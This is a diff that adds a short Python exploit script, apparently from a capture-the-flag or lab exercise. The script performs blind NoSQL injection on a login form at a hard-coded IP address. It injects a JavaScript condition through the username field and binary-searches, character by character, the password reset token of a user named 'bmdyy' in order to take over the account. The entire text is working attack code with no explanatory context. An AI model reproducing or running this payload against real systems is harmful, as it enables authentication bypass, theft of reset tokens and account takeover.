@@ -1,0 +1,29 @@
+#!/usr/bin/env python3
+
+from urllib.parse import quote_plus
+import requests
+
+def oracle(query):
+    r = requests.post(
+        "http://94.237.56.188:55422/login",
+        headers = {"Content-Type": "application/x-www-form-urlencoded"},
+        data = f"username={quote_plus(query)}&password=doesNotMatterIamBypassed"
+    )
+    return "credentials." in r.text
+
+passwordResetToken = ""
+for i in range(24):
+    low = 45
+    high = 90
+    mid = 0
+
+    while low <= high:
+        mid = (high + low) // 2
+        if oracle(f'" || (this.username == "bmdyy" && this.token.charCodeAt({i}) > {mid}) || "" != "'):
+            low = mid + 1
+        elif oracle(f'" || (this.username == "bmdyy" && this.token.charCodeAt({i}) < {mid}) || "" != "'):
+            high = mid - 1
+        else: 
+            passwordResetToken += chr(mid)
+            break
+print("Password Reset Token:", passwordResetToken)
